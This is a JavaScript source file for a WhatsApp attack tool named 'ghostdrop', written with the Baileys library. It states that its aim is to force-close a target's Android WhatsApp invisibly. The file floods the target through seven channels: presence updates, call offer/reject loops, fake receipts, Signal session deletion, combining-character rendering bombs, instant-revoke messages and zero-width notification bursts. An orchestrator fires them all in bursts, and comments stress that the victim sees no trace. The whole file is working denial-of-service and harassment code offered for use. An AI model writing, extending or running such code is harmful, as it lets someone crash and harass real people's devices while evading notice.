// ./SY/S7/ghostdrop.js
// ghostdrop — invisible background force-close for Android WhatsApp.
// No time loop. No persistent chat trace. Every visible surface is
// wrapped in ephemeral=1 or immediately revoked. Primary pressure on
// invisible channels: presence, call signaling, receipt, key session,
// notification pipeline.

const {
    generateWAMessageFromContent,
    delay,
} = require('@whiskeysockets/baileys');

// ---------- relay with ephemeral wrap ----------
async function relay(client, targetJid, content, opts = {}) {
    const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
    const waMsg = generateWAMessageFromContent(targetJid, content, {
        userJid,
        timestamp: new Date(),
        ephemeralExpiration: opts.ephemeral ?? 1,
        ephemeralSettingTimestamp: Date.now(),
    });
    await client.relayMessage(targetJid, waMsg.message, {
        messageId: waMsg.key.id,
        ...opts,
    });
    return waMsg.key.id;
}

async function resolveBestJid(client, targetJid) {
    try {
        const store = client?.signalRepository?.lidMapping;
        if (store && typeof store.getLIDForPN === 'function') {
            const lid = await store.getLIDForPN(targetJid);
            if (lid) return lid;
        }
    } catch {}
    return targetJid;
}

// ============================================================
// INVISIBLE CHANNEL 1 — presence storm
// composing / recording / paused toggle. No chat trace.
// Server round-trips + client-side indicator rebuild per toggle.
// ============================================================
async function presenceStorm(client, jid, rounds = 200) {
    const states = ['composing', 'paused', 'recording', 'paused'];
    for (let i = 0; i < rounds; i++) {
        try {
            if (typeof client.sendPresenceUpdate === 'function') {
                await client.sendPresenceUpdate(states[i % states.length], jid);
            }
        } catch {}
        await delay(80);
    }
}

// ============================================================
// INVISIBLE CHANNEL 2 — call signaling storm
// offer + reject loop. Call log only — no chat entry.
// ============================================================
async function callSignalingStorm(client, jid, rounds = 60) {
    for (let i = 0; i < rounds; i++) {
        const callId = `C${Date.now()}${Math.random().toString(36).slice(2, 8)}`.toUpperCase();
        try {
            if (typeof client.offerCall === 'function') {
                await client.offerCall(jid, callId);
                await delay(150);
                if (typeof client.rejectCall === 'function') {
                    await client.rejectCall(jid, callId).catch(() => {});
                }
            } else {
                await relay(client, jid, {
                    call: { callKey: new Uint8Array([0,0,0,0,0,0,0,i]) },
                }, { ephemeral: 0 });
            }
        } catch {}
        await delay(700);
    }
}

// ============================================================
// INVISIBLE CHANNEL 3 — receipt storm
// Read/delivered receipts on nonexistent message IDs.
// No visible trace. Protocol-level churn.
// ============================================================
async function receiptStorm(client, jid, count = 200) {
    if (typeof client.sendReceipt !== 'function') return;
    for (let i = 0; i < count; i++) {
        try {
            const fakeId = `FAKE${Date.now()}${i}`.padEnd(20, 'X').slice(0, 20);
            await client.sendReceipt(jid, 'read', [fakeId]).catch(() => {});
            await client.sendReceipt(jid, 'delivered', [fakeId]).catch(() => {});
        } catch {}
        if (i % 20 === 0) await delay(100);
    }
}

// ============================================================
// INVISIBLE CHANNEL 4 — key session churn
// Force Signal session re-establishment repeatedly.
// No visible trace. Crypto + network pipeline pressure.
// ============================================================
async function keySessionChurn(client, jid, rounds = 40) {
    for (let i = 0; i < rounds; i++) {
        try {
            const store = client?.signalRepository;
            if (store && typeof store.deleteSession === 'function') {
                await store.deleteSession(jid);
            }
        } catch {}
        await delay(150);
    }
}

// ============================================================
// QUASI-INVISIBLE 5 — ephemeral shaping micro-bomb
// Tiny shaping payload + ephemeral=1. Arrives, renders, vanishes
// before user can open chat in most cases.
// ============================================================
async function ephemeralShapingBomb(client, jid, rounds = 40) {
    const combining =
        '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309' +
        '\u030A\u030B\u030C\u030D\u030E\u030F\u0310\u0311\u0312\u0313';
    const payload = 'a' + combining.repeat(400);

    for (let i = 0; i < rounds; i++) {
        try {
            await relay(client, jid, {
                extendedTextMessage: {
                    text: payload,
                    contextInfo: { mentionedJid: [jid] },
                },
            }, { ephemeral: 1 });
        } catch {}
        await delay(220);
    }
}

// ============================================================
// QUASI-INVISIBLE 6 — send + immediate revoke
// Message arrives, notif pops, message deleted instantly.
// Only "This message was deleted" remains if revoke fails.
// ============================================================
async function revokeImmediateBomb(client, jid, rounds = 30) {
    for (let i = 0; i < rounds; i++) {
        try {
            const sent = await client.sendMessage(jid, { text: `g${i}_${'x'.repeat(80)}` });
            const key = sent?.key;
            if (key) {
                await delay(60);
                await client.sendMessage(jid, { delete: key }).catch(() => {});
            }
        } catch {}
        await delay(180);
    }
}

// ============================================================
// QUASI-INVISIBLE 7 — notification burst, tiny payload
// Uses ephemeral + minimal text. Chat marker clears quickly.
// ============================================================
async function notificationBurst(client, jid, rounds = 100) {
    for (let i = 0; i < rounds; i++) {
        try {
            await relay(client, jid, {
                extendedTextMessage: {
                    text: '\u200b',
                    contextInfo: { mentionedJid: [jid] },
                },
            }, { ephemeral: 1 });
        } catch {}
        if (i % 10 === 0) await delay(120);
    }
}

// ============================================================
// ORCHESTRATOR — single burst, invisible channels prioritized
// ============================================================
async function ghostDrop(client, targetJid, options = {}) {
    if (!client) throw new Error('ghostdrop: client required');
    if (!targetJid) throw new Error('ghostdrop: targetJid required');

    const useLid = options.useLid !== false;
    const jid = useLid ? await resolveBestJid(client, targetJid) : targetJid;

    const bursts = Number.isFinite(options.bursts) ? options.bursts : 3;
    const gapMs  = Number.isFinite(options.gapMs)  ? options.gapMs  : 500;

    const report = { jid, bursts: 0, channels: {} };

    for (let b = 0; b < bursts; b++) {
        const runs = [
            ['presence',    () => presenceStorm(client, jid, 200)],
            ['callsig',     () => callSignalingStorm(client, jid, 40)],
            ['receipt',     () => receiptStorm(client, jid, 150)],
            ['keysession',  () => keySessionChurn(client, jid, 30)],
            ['ephemeral',   () => ephemeralShapingBomb(client, jid, 30)],
            ['revoke',      () => revokeImmediateBomb(client, jid, 25)],
            ['notifburst',  () => notificationBurst(client, jid, 80)],
        ];

        const results = await Promise.allSettled(runs.map(([, fn]) => fn()));

        runs.forEach(([name], i) => {
            const ok = results[i].status === 'fulfilled';
            report.channels[name] = (report.channels[name] || 0) + (ok ? 1 : 0);
        });

        report.bursts++;
        await delay(gapMs);
    }

    return report;
}

module.exports = {
    ghostDrop,
    presenceStorm,
    callSignalingStorm,
    receiptStorm,
    keySessionChurn,
    ephemeralShapingBomb,
    revokeImmediateBomb,
    notificationBurst,
    resolveBestJid,
};
